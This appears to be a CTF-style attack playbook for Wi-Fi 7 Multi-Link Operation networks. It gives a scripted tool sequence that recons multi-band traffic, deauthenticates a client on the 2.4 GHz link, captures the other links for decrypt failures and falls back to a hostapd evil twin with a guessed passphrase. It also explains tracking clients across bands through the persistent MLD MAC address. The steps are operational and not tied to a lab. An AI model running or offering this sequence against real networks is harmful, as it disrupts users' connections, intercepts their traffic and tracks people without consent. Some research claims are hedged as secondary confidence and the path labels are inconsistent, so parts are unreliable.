# Wi-Fi 7 MLO flag — link-desync between 2.4/5/6 GHz

Multi-Link Operation shares one PTK across links. A per-link desync
(one link suppressed, others up) can surface an inconsistency in the
security context — where 2024–2026 research is publishing primitives.

## Recognition

- **EHT Capabilities IE (ext ID 108)** in beacons.
- **Basic Multi-Link element** in (Re)Association Requests carrying
  the MLD MAC.
- Multiple per-link BSSIDs on the same ESSID.

## The one-shot sequence

```python
run_sequence([
    # 1. Passive multi-band capture.
    {"action": "recon_start", "band": "abg", "dwell_ms": 250},
    {"action": "wait", "s": 20},
    {"action": "recon_stop"},

    # 2. Identify the MLD and the per-link BSSIDs.
    {"action": "list_mld_targets",
     "src_pcap": "/tmp/recon.pcapng",
     "out": "/tmp/mlds.json"},

    # 3. Deauth ONLY on the 2.4 GHz link — the weakest, most reachable.
    {"action": "deauth_targeted",
     "bssid": "<per-link BSSID on 2.4>",
     "client": "<per-link MAC on 2.4>",
     "count": 3},

    # 4. Watch the 5/6 GHz links for decrypt-fail or key-reinstall.
    {"action": "capture_start",
     "iface": "wlan1mon",
     "band": "5",
     "out_path": "/tmp/mlo-5ghz.pcapng"},
    {"action": "wait", "s": 30},
    {"action": "capture_stop"},

    # 5. Fall back — per-link evil twin on 2.4 GHz.
    {"action": "hostapd_up",
     "ssid": "<target ESSID>",
     "channel": 6,
     "wpa": 2,
     "wpa_key_mgmt": "WPA-PSK",
     "wpa_passphrase": "<known or guessed>"},
])
```

## The flag surface

Two candidates:

1. **A decrypt-fail or replayed frame** on the surviving link is the
   flag payload. This is the frontier-research path; specific
   primitives track `wifi7-mlo-link-desync` in attacks.json.
2. **Fallback association** to your per-link evil twin. Wi-Fi 7
   clients still associate as legacy single-link STAs when only one
   band is available.

## Recon detail — MLD MAC vs. link MAC

Even when a client randomizes per-link MACs, the MLD MAC persists in
some frames (Basic Multi-Link element, some action frames). Correlate
sightings across bands via the MLD MAC to identify a client across
seemingly-independent radios.

## Failure modes

- **Client refuses non-MLO fallback.** Some enterprise supplicants
  require MLO on MLO-tagged profiles.
- **All links PMF-required.** Path B (link-desync via deauth) closes.
  Path 5 (per-link evil twin) still works via RSSI.
- **Per-link MAC randomization without MLD leak.** Rare but possible
  in some 2026 patched supplicants.

## Cite

- attacks.json: `wifi7-mlo-link-desync` (confidence: secondary —
  active frontier area).
- IEEE Std 802.11be-2024, §35 (MLO).
